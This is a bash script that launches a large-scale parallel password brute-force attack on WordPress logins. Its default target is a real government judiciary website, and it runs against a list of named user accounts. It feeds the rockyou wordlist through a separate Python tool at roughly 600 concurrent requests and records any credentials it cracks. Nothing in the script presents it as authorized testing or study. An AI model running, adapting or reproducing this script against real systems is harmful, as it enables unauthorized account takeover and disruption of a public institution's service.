#!/usr/bin/env bash
# 50k chunks, parallel chunk workers, all users sequential.
set -euo pipefail

TARGET="${TARGET:-https://sc.judiciary.gov.ph}"
CHUNK_DIR="${CHUNK_DIR:-/root/BruteWP/wordlists/rockyou_50k}"
THREADS="${THREADS:-150}"
PARALLEL_CHUNKS="${PARALLEL_CHUNKS:-4}"
LOG="${LOG:-/root/BruteWP/brute_run.log}"
SCRIPT="${SCRIPT:-/root/BruteWP/bruteWP_headless.py}"

USERS=(tyke-test-admin scweb pio_tyke pio_jerome pio_rus)

if [[ ! -d "$CHUNK_DIR" ]] || [[ -z "$(ls -A "$CHUNK_DIR"/chunk_*.txt 2>/dev/null)" ]]; then
  echo "[*] Splitting rockyou into 50k chunks..."
  python3 "$SCRIPT" --split /root/BruteWP/wordlists/rockyou.txt -w "$CHUNK_DIR" --chunk-size 50000
fi

NCHUNKS=$(ls -1 "$CHUNK_DIR"/chunk_*.txt | wc -l)
echo "[*] $NCHUNKS chunks | $THREADS threads/chunk | $PARALLEL_CHUNKS parallel chunks" | tee -a "$LOG"
echo "[*] Effective concurrency ~$((THREADS * PARALLEL_CHUNKS)) requests" | tee -a "$LOG"

for user in "${USERS[@]}"; do
  echo "===== USER $user $(date -Iseconds) =====" >> "$LOG"
  python3 "$SCRIPT" \
    -u "$TARGET" -U "$user" -w "$CHUNK_DIR" \
    -t "$THREADS" -p "$PARALLEL_CHUNKS" -l "$LOG" || true
  if [[ -f /root/BruteWP/found_credentials.txt ]] && rg -q "$user" /root/BruteWP/found_credentials.txt 2>/dev/null; then
    echo "[+] Credential found for $user — continuing to next user per config"
  fi
  sleep 15
done

echo "===== ALL USERS FINISHED $(date -Iseconds) =====" >> "$LOG"
